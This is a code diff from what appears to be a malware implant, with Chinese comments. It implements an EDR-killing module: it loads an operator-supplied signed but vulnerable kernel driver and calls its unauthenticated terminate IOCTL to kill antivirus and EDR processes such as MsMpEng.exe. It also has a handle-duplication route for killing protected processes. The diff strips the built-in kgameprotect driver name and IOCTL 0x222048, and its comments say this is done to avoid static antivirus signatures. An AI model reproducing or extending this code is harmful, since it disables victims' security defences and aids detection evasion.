@@ -16,55 +16,46 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// ─── BYOVD 驱动加载 + 进程击杀（kgameprotect）──────────────────────────
+// ─── 驱动加载 + 进程击杀（驱动由操作员提供）────────────────────────────
 //
-// 内置驱动：kgameprotect.sys（国产游戏反作弊驱动，WHQL 签名，见服务端
-//   internal/server/drivers）。设备 `\\.\kgameprotect`，漏洞 IOCTL 0x222048
-//   （METHOD_BUFFERED + FILE_ANY_ACCESS，入参首个 DWORD = PID）：驱动内部直接
-//   PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) →
-//   ZwTerminateProcess，无需调用方权限，因此可终止普通杀软/EDR 进程。
+// v1.3.3 起**不内置任何驱动**：驱动名、服务名、设备路径、终止 IOCTL 全部由服务端
+// 在任务数据里下发（服务端从操作员上传的 .sys 与其填写的档案读取）。这样载荷里
+// 不会出现任何具体驱动名/IOCTL 明文 —— 之前内置驱动时，这些明文是最稳定的静态
+// 查杀特征（AV/EDR 普遍按易受攻击驱动名与 IOCTL 做规则）。
 //
-// ⚠️ 该驱动**不具备任意内核读写能力**（只能按 PID 终止进程），因此植入端不再有
-//   任何"读写内核虚拟地址、改 EPROCESS.Protection"的路线：原先配套的"任意内存
-//   读写"型驱动路线（相关常量、IOCTL、EPROCESS 地址获取与保护清除 helper、
-//   动态偏移探测调用）已全部删除，不留死代码、不留误导性文案。对 PPL 保护进程
-//   该终止 IOCTL 无效，PPL 击杀只走句柄窃取路线（见 handlePPLKill）。
+// 典型驱动能力（由操作员自己的驱动决定）：
+//   进程终止型：暴露一个无鉴权终止 IOCTL（METHOD_BUFFERED，入参首个 DWORD = PID），
+//   驱动内部 PsLookupProcessByProcessId → ObOpenObjectByPointer(PROCESS_TERMINATE) →
+//   ZwTerminateProcess，无需调用方权限，可终止普通杀软/EDR 进程（对 PPL 进程无效）。
+//   PPL 场景需要自带"具备内核读写"的驱动，本文件不预置任何相关常量或偏移。
 //
-// byovd_load：把操作员提供的（已签名但易受攻击的）驱动 .sys 写入系统驱动目录，
-//   通过 SCM 创建并启动内核服务，返回设备路径（如 \\.\kgameprotect）。
+// drv_load：把操作员提供的（已签名但易受攻击的）驱动 .sys 写入系统驱动目录，
+//   通过 SCM 创建并启动内核服务，返回设备路径。服务名/设备名一律由服务端下发，
+//   **植入端不内置任何驱动名**（v1.3.3 起取消内置驱动：内置即等于把驱动名与 IOCTL
+//   明文写进每个载荷，是最稳定的静态查杀特征）。
 //   写入前会先尽力停止同名旧服务并删除旧文件（防止文件被占用）。
-// byovd_unload：停止并删除服务、删除驱动文件。
-// byovd_kill：解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}（可选
-//   {"device":...,"ioctl":...} 覆盖驱动档案），对每个 PID 调用 kgameprotect 的
-//   无鉴权终止 IOCTL（默认 0x222048）结束进程。
+// drv_unload：停止并删除服务、删除驱动文件（服务名同样由服务端下发）。
+// drv_kill：解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
+//   并**必须**带 {"device":"\\\\.\\yourdrv","ioctl":"0x??????"}（由服务端从操作员
+//   填写的驱动档案下发），对每个 PID 调用该驱动的无鉴权终止 IOCTL 结束进程。
 // ppl_kill：先直接 TerminateProcess；失败（PPL/自保护进程拒绝访问）时走
-//   NtDuplicateObject 句柄窃取路线后终止。
+//   NtDuplicateObject 句柄窃取路线后终止（不依赖任何驱动）。
 
-// 内置 BYOVD 驱动 kgameprotect 的终止 IOCTL（数值常量，不受字符串混淆影响）。
-const kgKillIOCTL = 0x222048 // METHOD_BUFFERED + FILE_ANY_ACCESS，入参首个 DWORD = PID
-
-// 设备名与服务名必须用 var 声明：构建期会做字符串混淆（把字面量改写成 xd("...")
-// 调用），const 声明里不允许非恒定表达式，写进 const 会导致 full 档编译失败。
-var (
-	kgDevice  = `\\.\kgameprotect`
-	kgService = "kgameprotect" // byovd_load / byovd_unload 的默认服务名
-)
-
-func handleBYOVDLoad(taskData string) (string, int32, string) {
+func handleDrvLoad(taskData string) (string, int32, string) {
 	var req struct {
 		DriverB64   string `json:"driver_b64"`
 		ServiceName string `json:"service_name"`
 		DeviceName  string `json:"device_name"`
 	}
 	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
-		return "", -1, fmt.Sprintf("parse byovd data failed: %v", err)
+		return "", -1, fmt.Sprintf("parse driver data failed: %v", err)
 	}
 	if req.DriverB64 == "" {
 		return "", -1, "missing driver_b64（请上传 .sys 驱动文件）"
 	}
 	svc := req.ServiceName
 	if svc == "" {
-		svc = kgService
+		return "", -1, "missing service_name（服务名由操作员指定，植入端不内置任何驱动）"
 	}
 	driver, err := base64Decode(req.DriverB64)
 	if err != nil {
@@ -118,14 +109,14 @@ func handleBYOVDLoad(taskData string) (string, int32, string) {
 	return fmt.Sprintf("driver loaded: service=%s, device=%s, path=%s %s", svc, dev, drvPath, note), 0, ""
 }
 
-func handleBYOVDUnload(taskData string) (string, int32, string) {
+func handleDrvUnload(taskData string) (string, int32, string) {
 	var req struct {
 		ServiceName string `json:"service_name"`
 	}
 	_ = json.Unmarshal([]byte(taskData), &req)
 	svc := req.ServiceName
 	if svc == "" {
-		svc = kgService
+		return "", -1, "missing service_name（服务名由操作员指定，植入端不内置任何驱动）"
 	}
 	if err := stopKernelService(svc); err != nil {
 		return "", -1, fmt.Sprintf("stop service failed: %v", err)
@@ -134,15 +125,12 @@ func handleBYOVDUnload(taskData string) (string, int32, string) {
 	return "driver unloaded: " + svc, 0, ""
 }
 
-// byovdKillByPID 通过驱动的无鉴权进程终止 IOCTL 结束指定 PID。
-// device/ioctl 为空时使用内置 kgameprotect 默认值（设备 `\\.\kgameprotect`、
-// IOCTL 0x222048）；METHOD_BUFFERED 的入参就是 4 字节 PID，无出参。
-func byovdKillByPID(device string, ioctl uint32, pid uint32) error {
-	if device == "" {
-		device = kgDevice
-	}
-	if ioctl == 0 {
-		ioctl = kgKillIOCTL
+// drvXferPid 通过驱动的无鉴权进程终止 IOCTL 结束指定 PID。
+// device/ioctl 必须由服务端下发（服务端从操作员填写的驱动档案读取），
+// 植入端不内置任何默认值；METHOD_BUFFERED 的入参就是 4 字节 PID，无出参。
+func drvXferPid(device string, ioctl uint32, pid uint32) error {
+	if device == "" || ioctl == 0 {
+		return fmt.Errorf("驱动设备名或终止 IOCTL 为空：请先在界面加载你的 .sys 并填写设备名与 IOCTL")
 	}
 
 	procCreateFileW := resolveAPI("kernel32.dll", "CreateFileW")
@@ -153,7 +141,7 @@ func byovdKillByPID(device string, ioctl uint32, pid uint32) error {
 	// GENERIC_READ|GENERIC_WRITE(0xC0000000)、FILE_SHARE_READ|FILE_SHARE_WRITE(0x3)、OPEN_EXISTING(3)
 	h, _, _ := procCreateFileW.Call(uintptr(unsafe.Pointer(pw)), 0xC0000000, 0x3, 0, 3, 0, 0)
 	if h == ^uintptr(0) {
-		return fmt.Errorf("打开 %s 失败：请先用 byovd_load 加载内置 kgameprotect.sys（或确认驱动是否被系统拦截）", device)
+		return fmt.Errorf("打开 %s 失败：请先在界面加载你的 .sys 驱动（或确认驱动是否被系统/杀软拦截）", device)
 	}
 	defer procCloseHandle.Call(h)
 
@@ -167,10 +155,10 @@ func byovdKillByPID(device string, ioctl uint32, pid uint32) error {
 	return nil
 }
 
-// handleBYOVDKill 解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
-// 对每个解析出的 PID 调用 kgameprotect 的无鉴权终止 IOCTL。
-// 可选字段 device/ioctl 用于覆盖驱动档案（缺省用内置 kgameprotect 默认值）。
-func handleBYOVDKill(taskData string) (string, int32, string) {
+// handleDrvKill 解析 {"pid":1234} 或 {"process_name":"MsMpEng.exe"}，
+// 对每个解析出的 PID 调用操作员提供的驱动的无鉴权终止 IOCTL。
+// device/ioctl 由服务端从驱动档案下发（植入端不内置默认值）。
+func handleDrvKill(taskData string) (string, int32, string) {
 	var req struct {
 		PID         uint32 `json:"pid"`
 		ProcessName string `json:"process_name"`
@@ -178,16 +166,13 @@ func handleBYOVDKill(taskData string) (string, int32, string) {
 		IOCTL       uint32 `json:"ioctl"`
 	}
 	if err := json.Unmarshal([]byte(taskData), &req); err != nil {
-		return "", -1, fmt.Sprintf("parse byovd_kill data failed: %v", err)
+		return "", -1, fmt.Sprintf("parse kill data failed: %v", err)
 	}
 
 	device := req.Device
-	if device == "" {
-		device = kgDevice
-	}
 	ioctl := req.IOCTL
-	if ioctl == 0 {
-		ioctl = kgKillIOCTL
+	if device == "" || ioctl == 0 {
+		return "", -1, "missing device/ioctl（驱动设备名与终止 IOCTL 由服务端从操作员档案下发；植入端不内置默认驱动）"
 	}
 
 	// 目标解析：pid 直接反查进程名；process_name 走 Toolhelp32 快照解析成 PID 列表后逐个尝试。
@@ -215,17 +200,17 @@ func handleBYOVDKill(taskData string) (string, int32, string) {
 	}
 
 	var b strings.Builder
-	b.WriteString(fmt.Sprintf("== BYOVD Kill (kgameprotect, IOCTL 0x%06X) ==\n", ioctl))
+	b.WriteString(fmt.Sprintf("== Driver Kill (IOCTL 0x%06X, device %s) ==\n", ioctl, device))
 	for _, t := range targets {
 		name := t.name
 		if name == "" {
 			name = "unknown"
 		}
-		if err := byovdKillByPID(device, ioctl, t.pid); err != nil {
+		if err := drvXferPid(device, ioctl, t.pid); err != nil {
 			b.WriteString(fmt.Sprintf("[-] %v\n", err))
 			continue
 		}
-		b.WriteString(fmt.Sprintf("[+] killed %d (%s) via kgameprotect (IOCTL 0x%06X)\n", t.pid, name, ioctl))
+		b.WriteString(fmt.Sprintf("[+] killed %d (%s) via driver IOCTL 0x%06X\n", t.pid, name, ioctl))
 	}
 	return b.String(), 0, ""
 }
@@ -243,7 +228,7 @@ func handlePPLKill(taskData string) (string, int32, string) {
 
 	var b strings.Builder
 	b.WriteString("== PPL Kill ==\n")
-	b.WriteString("[*] PPL 击杀路线：句柄窃取（DuplicateHandle from 受保护进程）；内置驱动 kgameprotect 只提供进程终止 IOCTL，不具备内核读写，无法直接改 EPROCESS.Protection\n")
+	b.WriteString("[*] PPL 击杀路线：句柄窃取（DuplicateHandle from 受保护进程）；该路线不依赖任何驱动（若已加载具备内核读写的驱动，可自行改用其 IOCTL 直接改 EPROCESS.Protection）\n")
 
 	// 收集目标：(进程名, pid)。names 走 Toolhelp32 快照；pids 直接反查进程名。
 	type target struct {
@@ -281,7 +266,7 @@ func handlePPLKill(taskData string) (string, int32, string) {
 		if err := killPPLNoDriver(t.pid); err == nil {
 			b.WriteString(fmt.Sprintf("[+] %s (pid=%d) terminated via handle duplication\n", t.name, t.pid))
 		} else {
-			b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 句柄窃取失败（受保护进程未持有可复制句柄；普通杀软/EDR 进程请用 byovd_kill + 内置 kgameprotect）: %v\n", t.name, t.pid, err))
+			b.WriteString(fmt.Sprintf("[-] %s (pid=%d): 句柄窃取失败（受保护进程未持有可复制句柄；普通杀软/EDR 进程请改用驱动击杀 drv_kill，需自备驱动）: %v\n", t.name, t.pid, err))
 		}
 	}
 	return b.String(), 0, ""
